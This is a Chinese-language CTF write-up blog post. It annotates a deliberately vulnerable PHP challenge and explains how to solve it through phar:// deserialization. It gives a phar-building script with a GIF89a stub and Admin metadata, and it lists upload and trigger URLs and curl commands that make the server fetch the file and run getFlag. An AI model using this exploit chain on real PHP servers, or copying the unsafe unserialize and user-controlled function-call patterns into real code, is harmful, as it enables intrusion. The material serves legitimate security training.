---
title: 记一次CTF拉练
tags: CTF
typora-root-url: ../
date: 2020-06-12 10:04:58
---

#### 前言

这篇文章讲述了一次CTF拉练的一道php的白盒审计题，该文章也是接着Phar://这篇文章写的，主要是记录一下。

<!--more-->

#### 源码

![](/img/%E8%AE%B0%E4%B8%80%E6%AC%A1CTF%E6%8B%89%E7%BB%83/index.php.png)

```php
<?php
if (!file_exists("/var/www/data/secret")) { //判断是否存在secret文件，不存在将写入secret文件，存在读取文件
    $SECRET = randomkeys(16); //生成16随机字符
    file_put_contents("/var/www/data/secret", $SECRET); //将生成的16随机字符串写入secret文件
} else {
    $SECRET = file_get_contents("/var/www/data/secret"); //将整个文件读入一个字符串
}
if (isset($_SERVER["HTTP_X_REAL_IP"])) //判断$_SERVER["HTTP_X_REAL_IP"]是否设置并且非空
	$SERVER_IP = $_SERVER["HTTP_X_REAL_IP"]; //true就赋值给$SERVER_IP
else $SERVER_IP = $_SERVER["REMOTE_ADDR"]; //false就获取用户的 IP 地址赋值给$SERVER_IP
$SANDBOX = "/var/www/data/" . base64_encode("ctf" . $SERVER_IP); //路径为/var/www/data/加base64编码(ctf+$SERVER_IP) .代表拼接
@mkdir($SANDBOX); //创建$SANDBOX文件夹 单独的沙盒文件夹
@chdir($SANDBOX); //改变目录$SANDBOX

if (!isset($_COOKIE["session-data"])) { //检查变量是否已设置且不为NULL，不存在将
    $data = serialize(new User($SANDBOX)); //序列化
    $hmac = hash_hmac("sha1", $data, $SECRET); //生成哈希值，sha1算法，$data加密数据，$SECRET为所使用的密钥，
    setcookie("session-data", sprintf("%s-----%s", $data, $hmac)); //向客户端发送一个HTTPcookie，唯一的标识对象加上签名作为session-data
}

class User {
    public $avatar;
    function __construct($path) { //允许在实例化一个类之前先执行构造方法。
        $this->avatar = $path; //标识路径为头像的路径
    }
}

class Admin extends User { 
    function __destruct() { //析构函数
        $_GET["lucky"](); //php 通过GET变量来调用函数
    }
}

function randomkeys($length){   //定义生成随机数方法
    $output='';   
    for ($a = 0; $a<$length; $a++) {   
        $output .= chr(mt_rand(0, 0xFF));    //生成php随机数   
     }   
     return $output;   
 }   

function getFlag() { //定义读取flag方法
    $flag = file_get_contents("/flag");		//把文件字符串读取赋值给$flag
    echo $flag;  //输出flag
}

function check_session() {
    global $SECRET;
    $data = $_COOKIE["session-data"];
    list($data, $hmac) = explode("-----", $data, 2); // 从cookie中取出data和hmac签名存到数组（字符串打散为数组）
    if (!isset($data, $hmac) || !is_string($data) || !is_string($hmac)) { #判断是否为空
        die("Bye");
    }

    if (!hash_equals(hash_hmac("sha1", $data, $SECRET), $hmac)) { // 判断data加密之后和hmac签名是否对应
        die("Bye Bye");
    }

    $data = unserialize($data); // 反序列化
    if (!isset($data->avatar)) { //如果反序列化之后的data包含的类中无avatar成员,输出一条消息，并退出当前脚本
        die("Bye Bye Bye");
    }

    return $data->avatar; //返回上传路径 
}

function upload($path) {
	// 检查文件头是否为GIF89a，不等于GIF89a 返回fuck off
    $data = file_get_contents($_GET["url"] . "/avatar.gif");
    if (substr($data, 0, 6) !== "GIF89a") {
        die("Fuck off");
    }

    file_put_contents($path . "/avatar.gif", $data); //把一个$data写入（路径）/avatar.gif文件中
    die("Upload OK");
}

function show($path) {
	// 查看/avatar.gif
    if (!file_exists($path . "/avatar.gif")) { //查文件或目录是否存在
        $path = "/var/www/html";
    }

    header("Content-Type: image/gif"); //gif图片格式 
    die(file_get_contents($path . "/avatar.gif")); //将文件内容读入输出并退出
}

$mode = $_GET["m"];
if ($mode == "upload") {
    upload(check_session()); //从cookie中提取data反序列化后的avatar成员并将其内容作为路径, 请求url中的内容写到该路径下的avatar.gif文件中
} else if ($mode == "show") {
    show(check_session()); //从cookie中提取data反序列化后的avatar成员并将其内容作为路径, 展示该目录下的avatar.gif
} else {
    highlight_file(__FILE__); //对取得当前文件的绝对地址文件进行语法高亮显示
}

```

#### 思路解析

首先分析代码, 首先定义了一个getFlag函数, 执行了这个函数就会出flag, 所以整道题的核心就是执行这个函数

题目主要有两个功能, 一个是在沙盒文件夹任意写入一个gif, 一个是根据cookie中的路径查看这个gif

#####  初步想法

admin是关键类,利用通过反序列化之后的析构函数去通过lucky参数去调用Getflag函数输出flag，而反序列化的data是从cookie中获得, 那先尝试一下伪造cookie,但是其实cookie后半部分是用hash_hmac和一个未知的秘钥生成的一个签名, 无法绕过判断机制，基本上不可能伪造的了。

##### 本题考点

php中解析Phar归档中的Metadata的时候会有反序列化的操作

https://www.php.net/manual/zh/phar.getmetadata.php

[Phar://](https://scriptkid-beta.github.io/2020/06/09/Phar/)

#### 解题步骤

##### 方式一

生成phar的gif头格式文件，并修改后缀名为gif

```php
<?php
    class Admin{
    }
    $phar = new Phar("avatar.phar"); //后缀名必须为phar
    $phar->startBuffering();
    $phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>"); //设置stubb，增加gif文件头
    $o = new Admin();
    $phar->setMetadata($o); //将自定义的meta-data存入manifest里
    $phar->addFromString("test.txt", "test"); // 添加要压缩的文件
    $phar->stopBuffering(); // 签名自动计算
?>
```

并将生成的gif图放到自己的http服务器中(这里本地python临时起的服务)

![image-20200611132224047](/img/%E8%AE%B0%E4%B8%80%E6%AC%A1CTF%E6%8B%89%E7%BB%83/image-20200611132224047.png)

```
http://www.xxxx.com/index.php?m=upload&url=http://10.255.252.192:8000

http://www.xxxx.com/index.php?m=upload&url=phar:///var/www/data/Y3RmMTAuMjU1LjI1Mi4xOTI=&lucky=getFlag
注:这里的base64编码（Y3RmMTAuMjU1LjI1Mi4xOTI=）是由(ctf加ip地址)进行base64编码得到的
```

![](/img/%E8%AE%B0%E4%B8%80%E6%AC%A1CTF%E6%8B%89%E7%BB%83/image-20200609084749799.png)

![image-20200609085038212](/img/%E8%AE%B0%E4%B8%80%E6%AC%A1CTF%E6%8B%89%E7%BB%83/image-20200609085038212.png)

##### 方式二

生成phar的gif头格式文件，并修改后缀名为gif

```
<?php
    class Admin{
    }
    $phar = new Phar("avatar.phar"); //后缀名必须为phar
    $phar->startBuffering();
    $phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>"); //设置stubb，增加gif文件头
    $o = new Admin();
    $phar->setMetadata($o); //将自定义的meta-data存入manifest里
    $phar->addFromString("test.txt", "test"); // 添加要压缩的文件
    $phar->stopBuffering(); // 签名自动计算
?>
```

并将生成的gif图放到自己的http服务器中(这里本地python临时起的服务)

![image-20200611132224047](/img/%E8%AE%B0%E4%B8%80%E6%AC%A1CTF%E6%8B%89%E7%BB%83/image-20200611132224047.png)

```
curl --cookie-jar idlefire "http://www.xxxx.com/index.php"

curl -b idlefire "http://www.xxxx.com/index.php?m=upload&url=http://10.255.252.192:8000/"

curl -b idlefire "http://www.xxxx.com/index.php?m=upload&url=phar:///var/www/data/Y3RmMTAuMjU1LjI1Mi4xOTI=&lucky=getFlag"

注:这里的base64编码（Y3RmMTAuMjU1LjI1Mi4xOTI=）是由(ctf加ip地址)进行base64编码得到的
```

![image-20200609085312907](/img/%E8%AE%B0%E4%B8%80%E6%AC%A1CTF%E6%8B%89%E7%BB%83/image-20200609085312907.png)

#### 写到最后

这题根据经典题目（[hitcon-ctf-2017baby^h-master-php-2017](https://github.com/t3hp0rP/hitconDockerfile/tree/master/hitcon-ctf-2017/baby^h-master-php-2017)）进行的改编，在某种程度上进行降低了难度。

#### 参考

https://www.jianshu.com/p/19e3ee990cb7

https://www.bilibili.com/read/cv6347230/

https://xz.aliyun.com/t/1773/

https://www.cnblogs.com/jxkshu/p/4997219.html